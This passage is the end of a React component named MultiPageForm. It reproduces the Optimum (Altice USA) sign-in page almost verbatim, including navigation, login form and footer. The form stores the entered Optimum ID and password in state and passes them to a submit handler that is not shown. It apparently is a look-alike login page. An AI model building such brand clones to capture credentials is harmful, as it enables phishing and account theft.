                              <div className="global-nav-primary__notification" style={{display: 'none'}}>
                                <a href="/tv/dvr" className="hbeam-inline badge-notification badge-primary">
                                  <div> <span className="badge-notification__count">DVR</span> </div>
                                </a>
                              </div>
                            </div>
                            <div className="hflow global-nav-primary__item block-link">
                              <div className="global-nav-primary__label">
                                <a className="global-header__link"> <span className="mega-menu-cursor global-header__link">Phone</span> </a>
                                <div className="phone-menu">
                                  <div style={{display: 'none'}}>
                                    <div>
                                      <div>
                                        <div className="header-dropmenu" style={{display: 'none'}}>
                                          <div className="menu-mdl">
                                            <div className="row phone-links">
                                              <div className="span6">
                                                <ul id="cms_content_phone">
                                                  <li><a href="https://voice.optimum.net//Voicemail/Show">Voicemail</a></li>
                                                  <li><a href="/phone/voicemail" style={{display: 'none'}}>Voicemail</a></li>
                                                  <li><a href="https://voice.optimum.net//CallHistory">Call history</a></li>
                                                  <li><a href="/phone/international-call" style={{display: 'none'}}>Call History</a></li>
                                                  <li><a href="https://voice.optimum.net//International/MyPlan">International</a></li>
                                                  <li><a href="https://www.optimum.com/internationalrates" style={{display: 'none'}}>International</a></li>
                                                  <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallWaiting" style={{display: 'none'}}>Call waiting</a></li>
                                                  <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallForwarding" style={{display: 'none'}}>Call forwarding</a></li>
                                                  <li><a href="https://voice.optimum.net//Features/CallingFeatures/VipRinging" style={{display: 'none'}}>VIP ringing</a></li>
                                                  <li><a href="https://voice.optimum.net//Features/CallingFeatures/BlockUnwantedCalls">Block unwanted calls</a></li>
                                                  <li><a href="/phone" style={{display: 'none'}}>Block unwanted calls</a></li>
                                                </ul>
                                              </div>
                                              <div className="span6">
                                                <ul>
                                                  <li><a href="https://voice.optimum.net//Features/CallingFeatures/FindMe" style={{display: 'none'}}>Find me</a></li>
                                                  <li><a href="https://voice.optimum.net//Features/CallingFeatures/PrivateOutboundCalls" style={{display: 'none'}}>Private calling</a></li>
                                                  <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallForwarding" style={{display: 'none'}}>BackUp phone</a></li>
                                                  <li><a href="https://voice.optimum.net//Features/DirectoryListing">Directory listing</a></li>
                                                  <li><a href="/phone" style={{display: 'none'}}>Directory Listing</a></li>
                                                  <li><a href="/support/phone">Support</a></li>
                                                  <li><a href="/pages/robocalls.html">Stop robocalls</a></li>
                                                </ul>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div style={{display: 'none'}}>
                                      <div className="header-dropmenu" style={{display: 'none'}}>
                                        <div className="menu-mdl">
                                          <div className="row phone-links">
                                            <div className="span6">
                                              <ul id="cms_content_phone">
                                                <li><a href="https://voice.optimum.net//Voicemail/Show">Voicemail</a></li>
                                                <li><a href="/phone/voicemail" style={{display: 'none'}}>Voicemail</a></li>
                                                <li><a href="https://voice.optimum.net//CallHistory">Call history</a></li>
                                                <li><a href="/phone/international-call" style={{display: 'none'}}>Call History</a></li>
                                                <li><a href="https://voice.optimum.net//International/MyPlan">International</a></li>
                                                <li><a href="https://www.optimum.com/internationalrates" style={{display: 'none'}}>International</a></li>
                                                <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallWaiting" style={{display: 'none'}}>Call waiting</a></li>
                                                <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallForwarding" style={{display: 'none'}}>Call forwarding</a></li>
                                                <li><a href="https://voice.optimum.net//Features/CallingFeatures/VipRinging" style={{display: 'none'}}>VIP ringing</a></li>
                                                <li><a href="https://voice.optimum.net//Features/CallingFeatures/BlockUnwantedCalls">Block unwanted calls</a></li>
                                                <li><a href="/phone" style={{display: 'none'}}>Block unwanted calls</a></li>
                                              </ul>
                                            </div>
                                            <div className="span6">
                                              <ul>
                                                <li><a href="https://voice.optimum.net//Features/CallingFeatures/FindMe" style={{display: 'none'}}>Find me</a></li>
                                                <li><a href="https://voice.optimum.net//Features/CallingFeatures/PrivateOutboundCalls" style={{display: 'none'}}>Private calling</a></li>
                                                <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallForwarding" style={{display: 'none'}}>BackUp phone</a></li>
                                                <li><a href="https://voice.optimum.net//Features/DirectoryListing">Directory listing</a></li>
                                                <li><a href="/phone" style={{display: 'none'}}>Directory Listing</a></li>
                                                <li><a href="/support/phone">Support</a></li>
                                                <li><a href="/pages/robocalls.html">Stop robocalls</a></li>
                                              </ul>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div>
                                    <div className="header-dropmenu" style={{display: 'none'}}>
                                      <div className="menu-top">
                                        <div className="row phone-links">
                                          <div className="span6">
                                            <ul id="cms_content_phone">
                                              <li><a href="https://voice.optimum.net//Voicemail/Show">Voicemail</a></li>
                                              <li><a href="/phone/voicemail" style={{display: 'none'}}>Voicemail</a></li>
                                              <li><a href="https://voice.optimum.net//CallHistory">Call history</a></li>
                                              <li><a href="/phone/international-call" style={{display: 'none'}}>Call History</a></li>
                                              <li><a href="https://voice.optimum.net//International/MyPlan">International</a></li>
                                              <li><a href="https://www.optimum.com/internationalrates" style={{display: 'none'}}>International</a></li>
                                              <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallWaiting" style={{display: 'none'}}>Call waiting</a></li>
                                              <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallForwarding" style={{display: 'none'}}>Call forwarding</a></li>
                                              <li><a href="https://voice.optimum.net//Features/CallingFeatures/VipRinging" style={{display: 'none'}}>VIP ringing</a></li>
                                              <li><a href="https://voice.optimum.net//Features/CallingFeatures/BlockUnwantedCalls">Block unwanted calls</a></li>
                                              <li><a href="/phone" style={{display: 'none'}}>Block unwanted calls</a></li>
                                            </ul>
                                          </div>
                                          <div className="span6">
                                            <ul>
                                              <li><a href="https://voice.optimum.net//Features/CallingFeatures/FindMe" style={{display: 'none'}}>Find me</a></li>
                                              <li><a href="https://voice.optimum.net//Features/CallingFeatures/PrivateOutboundCalls" style={{display: 'none'}}>Private calling</a></li>
                                              <li><a href="https://voice.optimum.net//Features/CallingFeatures/CallForwarding" style={{display: 'none'}}>BackUp phone</a></li>
                                              <li><a href="https://voice.optimum.net//Features/DirectoryListing">Directory listing</a></li>
                                              <li><a href="/phone" style={{display: 'none'}}>Directory Listing</a></li>
                                              <li><a href="/support/phone">Support</a></li>
                                              <li><a href="/pages/robocalls.html">Stop robocalls</a></li>
                                            </ul>
                                          </div>
                                        </div>
                                      </div>
                                      <div className="menu-bottom">
                                        <div>
                                          <h4><a href="/login">Sign in</a> to check your messages and manage your phone features</h4>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <div className="global-nav-primary__notification" style={{display: 'none'}}>
                                <div className="global-nav-primary__notification">
                                  <a href="https://voice.optimum.net//Voicemail" className="hbeam-inline badge-notification badge-primary">
                                    <div className="hbeam-part-static badge-notification__icon-container morePadding"> <i className="badge-notification__icon icon-phone moreWidth" /> </div>
                                  </a>
                                </div>
                              </div>
                              <div className="global-nav-primary__notification" style={{display: 'none'}}>
                                <a href="https://voice.optimum.net//Voicemail" className="hbeam-inline badge-notification badge-primary">
                                  <div className="hbeam-part-static badge-notification__icon-container"> <i className="badge-notification__icon icon-phone" /> </div>
                                  <div> <span className="badge-notification__count ng-binding">0</span> </div>
                                </a>
                              </div>
                            </div>
                            <div className="hflow global-nav-primary__item block-link no--dropdown">
                              <div className="global-nav-primary__label">
                                <a href="/upgrades" className="global-header__link" omtr="trackme" title="Upgrades Menu"> <span className="mega-menu-cursor global-header__link">My Offers</span> </a>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
        </div>
        <div>
          <section className="login">
            <div id="header" style={{backgroundColor: 'rgb(224, 224, 224)', color: 'rgb(0, 0, 0)'}}>
              <div className="container">
                <div className="row">
                  <div className="span12">
                    <h1 className="theme--primary" style={{backgroundColor: 'rgb(224, 224, 224)', color: 'rgb(0, 0, 0)'}}>Optimum Sign In</h1>
                  </div>
                </div>
              </div>
            </div>
            <div className="login-page">
              <div className="container">
                <div className="row">
                  <div className="alert-banner padding-s panel semflex full-width theme-alert" style={{display: 'none'}}>
                    <div if="model.icon" className="ab__icon semflex__auto ng-scope"> <span className="dot dot--white alert-background"><span className="dot-inner">
                          <i className="ng-scope icon-exclamation-major" />
                        </span></span>
                    </div>
                    <div className="ab__text text-unspace">
                      <h1 className="ab__title ng-binding" />
                      <div className="hflow grid-gutters-margin">
                      </div>
                    </div> <span className="alertButton">
                    </span> </div>
                </div>
                <div className="row">
                  <div className="alert-banner padding-s panel semflex full-width theme-success" style={{display: 'none'}}>
                    <div if="model.icon" className="ab__icon semflex__auto ng-scope"> <span className="dot dot--white"><span className="dot-inner">
                          <i className="ng-scope icon-ok" />
                        </span></span>
                    </div>
                    <div className="ab__text text-unspace">
                      <h1 className="ab__title ng-binding">Your password has been reset. Please sign in with your new password.</h1>
                      <div className="hflow grid-gutters-margin">
                      </div>
                    </div> <span className="alertButton">
                    </span> </div>
                </div>
                <div className="row">
                  <div className="login-container">
                    <div className="span8">
                      <form className="ng-valid ng-dirty" onSubmit={handleSubmit}>
                        <div id="login-box" className>
                          <div className="container">
                            <div className="row">
                              <div className="span12">
                                <h2 className="login-title"> <span style={{display: 'none'}}>Sign in to record your program</span> <span style={{display: 'none'}}>Sign in to see your guide</span> <span style={{display: 'none'}}>Sign in with your <strong>new password</strong></span> <span style={{display: 'none'}}>Sign in with your <strong>new password</strong></span> </h2>
                                <h2 className="login-title" style={{display: 'none'}}> <span>Sign in to accept your special offer</span> </h2>
                              </div>
                            </div>
                            <div className="row">
                              <div className="span5"> <label className="label">My Optimum ID</label> </div>
                              <div className="span7" />
                            </div>
                            <div className="row">
                              <div className="span5"><input type="text" id="loginPageUsername" autoCorrect="off" autoCapitalize="off" className="input input--highlight input-wrap loginid ng-pristine ng-valid" tabIndex={7} value={optimumid} onChange={(event) => setOptimumid(event.target.value)} />
                              </div>
                              <div className="span7 forgot" tabIndex={10}><a href="/recover-id/">I forgot my Optimum ID</a></div>
                            </div>
                            <div className="row">
                              <div className="span12 height10" />
                            </div>
                            <div className="row">
                              <div className="span5"> <label className="label">Password</label> </div>
                              <div className="span7" />
                            </div>
                            <div className="row">
                              <div className="span5"> <input type="password" id="loginPagePassword" autoCorrect="off" autoCapitalize="off" className="input input-highlight input-wrap loginpass ng-pristine ng-valid" tabIndex={8} value={password} onChange={(event) => setPassword(event.target.value)} />
                              </div>
                              <div className="span7 forgot"><a href="/reset-password/" tabIndex={11}>I forgot my password</a></div>
                            </div>
                            <div className="row">
                              <div className="span12 height10" />
                            </div>
                            <div className="row">
                              <div className="span12">
                                <hr /> </div>
                            </div>
                            <div className="row">
                              <div className="span12 hidden-phone"> <button className="btn btn--primary" id="target" tabIndex={9}>Sign in to Optimum.net</button> <button className="btn btn--secondary" id="target" tabIndex={9} style={{display: 'none'}}>Sign in</button>
                                <div type="checkbox" className="checkbox login-checkbox checkbox--secondary ng-valid  not-checked ng-dirty" tabIndex={12}>
                                  <div className="checkbox-inner" />
                                </div>
                                <div className="logged-in">Remember Me</div>
                              </div>
                            </div>
                            <div className="hidden-desktop hidden-tablet">
                              <div className="span10"> <button className="btn btn--primary" id="target" tabIndex={9}>Sign in to Optimum.net</button> <button className="btn btn--secondary" id="target" tabIndex={9} style={{display: 'none'}}>Sign in</button> </div>
                              <div className="span10 remember-me">
                                <div type="checkbox" className="checkbox login-checkbox checkbox--secondary ng-valid  not-checked ng-dirty" tabIndex={12}>
                                  <div className="checkbox-inner" />
                                </div> <span className="logged-in">Remember Me</span> </div>
                            </div>
                          </div>
                        </div>
                      </form>
                    </div>
                    <div className="span4">
                      <div id="create-id">
                        <h3>Don't have an Optimum ID?</h3>
                        <p>An Optimum ID is a unique username that provides access to extra services and benefits.</p>
                        <ul>
                          <li><span className="primary cta-arrow-link" cta-arrow-link href="/profile/create-optimum-id/">
                              <a className="font-cta-link" href="/profile/create-optimum-id/">
                                <span className="cta-wrap">
                                  <div className="cta-dot">
                                    <span><span className="ng-scope"><strong>Create an Optimum ID</strong></span></span> <i className="cta-circle dot dot--dark-overlay dotpie icon-arrow-right"><span className="dot-inner" /></i> </div>
                                </span>
                              </a>
                            </span>
                          </li>
                        </ul>
                      </div>
                      <div id="security-explanation" style={{display: 'none'}}>
                        <h3>Please sign in again</h3>
                        <p>To protect your most sensitive data, you may be asked to re-enter your password from time to time.</p>
                      </div>
                    </div>
                    <div className="optimum-id span4 signin-rightside" style={{display: 'none'}}>
                      <h3>Never forget another password</h3>
                      <p>Optimum's Password Manager allows you to securely manage online usernames and passwords on all of your devices.</p>
                      <ul>
                        <li><a href="/profile/create-optimum-id/" className="primary"><span className="primary cta-arrow-link"><strong>Find out more about Password Manager and other ways to protect yourself online</strong>&nbsp;&nbsp;<i className="cta-circle icon-arrow-right" /></span></a></li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>
          <section className="common-footer-help ng-scope" id="is-not-cpc-common-footer-help">
            <div className="container">
              <div className="row">
                <ul id="contact-list">
                  <li className="span4">
                    <a className="no-left" href="https://www.optimum.com/stores"> <span className="txt"><i className="icon-optstore" />Optimum Stores</span> </a>
                  </li>
                  <li className="span4 second-last">
                    <a className="no-left" href="https://twitter.com/messages/compose?recipient_id=705534415"> <span className="txt"><i className="icon-opthelp" />@OptimumHelp</span> </a>
                  </li>
                  <li className="span4">
                    <div id="LPMcontainer-1679424975987-0" className="LPMcontainer LPMoverlay" style={{margin: '1px', padding: '0px', borderStyle: 'solid', borderWidth: '0px', fontStyle: 'normal', fontWeight: 'normal', fontVariant: 'normal', listStyle: 'outside none none', letterSpacing: 'normal', lineHeight: 'normal', textDecoration: 'none', verticalAlign: 'baseline', whiteSpace: 'normal', wordSpacing: 'normal', backgroundRepeat: 'repeat-x', backgroundPosition: 'left bottom', cursor: 'auto', display: 'block', position: 'relative', top: '0px', left: '0px'}}>
                      <a className="no-left" href="/contactus"> <span className="txt help-last"><i className="icon-msg" /> Contact Us</span> </a>
                    </div>
                  </li>
                </ul>
                <div className="hidden-desktop hidden-tablet">&nbsp;</div>
              </div>
            </div>
          </section>
          <section className="common-footer-links ng-scope">
            <div className="container minHeightFooter">
              <div className="row">
                <div className="span12" id="is-not-cpc-hr">
                  <hr /> </div>
                <div className="span4 hidden-desktop hidden-tablet" id="is-not-cpc-footer-social-icon">
                  <ul>
                    <li className="footer-social-icon">
                      <a className="footer-logo-facebook" href="https://www.facebook.com/Optimum/" />
                    </li>
                    <li className="footer-social-icon">
                      <a className="footer-logo-twitter" href="https://twitter.com/optimum/" />
                    </li>
                    <li className="footer-social-icon">
                      <a className="footer-logo-instagram" href="https://instagram.com/optimum/" />
                    </li>
                    <li className="footer-social-icon">
                      <a className="footer-logo-youtube" href="https://www.youtube.com/Optimum" />
                    </li>
                  </ul>
                </div>
              </div>
              <div className="span9" id="is-not-cpc-footer-site-links">
                <div className="hidden-phone">
                  <ul className="footer-site-links">
                    <li><a href="/pages/ReportAbuse.html">Report Abuse</a><span className="footer-link-seperator">|</span></li>
                    <li><a href="https://www.optimum.com/accessibility">Accessibility</a> <span className="footer-link-seperator">|</span></li>
                    <li><a href="/pages/storm-preparedness.html">Storm Preparedness</a> <span className="footer-link-seperator">|</span></li>
                    <li><a href="https://www.optimum.com/terms-of-service/Legal-Compliance">Legal Compliance</a></li>
                  </ul>
                  <ul className="footer-site-links">
                    <li><a href="https://www.optimum.com/terms-of-service">Service Terms &amp; Info</a> <span className="footer-link-seperator">|</span></li>
                    <li><a href="https://www.optimum.com/terms-of-service/Copyright-Policy">Copyright Policy</a> <span className="footer-link-seperator">|</span></li>
                    <li><a href="https://www.optimum.com/terms-of-service/privacy/Customer-Privacy">Privacy Notice</a> <span className="footer-link-seperator">|</span></li>
                    <li><a href="https://alticeusa.com">About Altice USA</a></li>
                  </ul>
                </div>
                <div className="row margin-footer-link hidden-desktop hidden-tablet layout-mobile">
                  <div style={{float: 'left', width: '42%'}}>
                    <ul className="footer-site-links-mob">
                      <li><a href="/pages/ReportAbuse.html">Report Abuse</a></li>
                      <li><a href="https://www.optimum.com/accessibility">Accessibility</a></li>
                      <li><a href="/pages/storm-preparedness.html">Storm Preparedness</a></li>
                      <li><a href="https://www.optimum.com/terms-of-service/Legal-Compliance">Legal Compliance</a></li>
                    </ul>
                  </div>
                  <div style={{float: 'left', width: '42%'}}>
                    <ul className="footer-site-links-mob">
                      <li><a href="https://www.optimum.com/terms-of-service">Service Terms &amp; Info</a></li>
                      <li><a href="https://www.optimum.com/terms-of-service/Copyright-Policy">Copyright Policy</a></li>
                      <li><a href="https://www.optimum.com/terms-of-service/privacy/Customer-Privacy">Privacy Notice</a></li>
                      <li><a href="https://alticeusa.com">About Altice USA</a></li>
                    </ul>
                  </div>
                </div>
                <div className="span6 hide" id="is-cpc-footer-site-links">
                  <ul className="footer-site-links">
                    <li><a href="https://www.optimum.com/terms-of-service">Service Terms &amp; Info</a></li>
                    <li><a href="https://www.optimum.com/terms-of-service/Copyright-Policy">Copyright policy</a></li>
                    <li><a href="/pages/PrivacyExisting.html">Privacy policy</a></li>
                    <li><a href="https://www.optimum.com/terms-of-service/Legal-Compliance">Legal Compliance</a></li>
                  </ul>
                </div>
                <div className="span3 hidden-phone" id="is-not-cpc-footer-social-icon-phone">
                  <ul className="fltright">
                    <li className="footer-social-icon">
                      <a className="footer-logo-facebook" href="https://www.facebook.com/Optimum/" />
                    </li>
                    <li className="footer-social-icon">
                      <a className="footer-logo-twitter" href="https://twitter.com/optimum/" />
                    </li>
                    <li className="footer-social-icon">
                      <a className="footer-logo-instagram" href="https://instagram.com/optimum/" />
                    </li>
                    <li className="footer-social-icon">
                      <a className="footer-logo-youtube" href="https://www.youtube.com/Optimum" />
                    </li>
                  </ul>
                </div>
              </div>
              <div className="row paddingTop1em hidden-phone" style={{display: 'none'}}>
                <div className="span3 ipadWidth34">
                  <ul>
                    <li className="wide ng-binding">© Copyright 2023&nbsp; CSC Holdings, LLC.</li>
                  </ul>
                </div>
                <div id="new-customer-links" className="span9 opacityfour ipadWidth65" style={{display: 'none'}}>
                  <ul className="footer-site-links">
                    <li><a href="https://www.optimum.com/terms-of-service">Service Terms &amp; Info</a></li>
                    <li><a href="https://www.optimum.com/terms-of-service/Copyright-Policy">Copyright Policy</a></li>
                    <li><a href="https://www.optimum.com/terms-of-service/privacy/Customer-Privacy">Privacy Notice</a></li>
                    <li><a href="https://www.optimum.com/terms-of-service/Legal-Compliance">Legal Compliance</a></li>
                    <li><a href="https://alticeusa.com">About Altice USA</a></li>
                  </ul>
                </div>
              </div>
              <div className="row paddingTop1em hidden-desktop hideInDesktop hidden-tablet" style={{display: 'none'}}>
                <div className="span3">
                  <ul>
                    <li className="marginTopMobile5"><a href="https://www.optimum.com/terms-of-service">Service Terms &amp; Info</a></li>
                    <li className="marginTopMobile5"><a href="https://www.optimum.com/terms-of-service/Copyright-Policy">Copyright Policy</a></li>
                    <li className="marginTopMobile12"><a href="https://www.optimum.com/terms-of-service/privacy/Customer-Privacy">Privacy Notice</a></li>
                    <li><a href="https://www.optimum.com/terms-of-service/Legal-Compliance">Legal Compliance</a></li>
                    <li><a href="https://alticeusa.com">About Altice USA</a></li>
                  </ul>
                </div>
                <div id="new-customer-links" className="span6 opacitypointfour" style={{display: 'none'}}>
                  <ul className="footer-site-links">
                    <li className="wide ng-binding">© Copyright 2023&nbsp; CSC Holdings, LLC.</li>
                  </ul>
                </div>
              </div>
              <div className="row" id="is-not-cpc-icon-logo">
                <div className="span10 partner-icons">
                  <ul className="hidden-phone">
                    <li className="wide hidden-phone ng-binding">© Copyright 2023&nbsp;CSC Holdings, LLC.</li>
                  </ul>
                </div>
              </div>
              <div style={{clear: 'both'}}>&nbsp;</div>
              <div className="hidden-desktop hidden-tablet">
                <ul>
                  <li className="ng-binding"> © Copyright 2023&nbsp;CSC Holdings, LLC. </li>
                </ul>
              </div>
              <div className="row hide " id="is-cpc-icon-logo">
                <div className="span10">
                  <ul>
                    <li className="is-cpc-wide ng-binding">© Copyright 2023&nbsp; CSC Holdings, LLC.</li>
                  </ul>
                </div>
              </div>
            </div>
          </section>
        </div>
      </div>
    </>
  );
}

export default MultiPageForm;
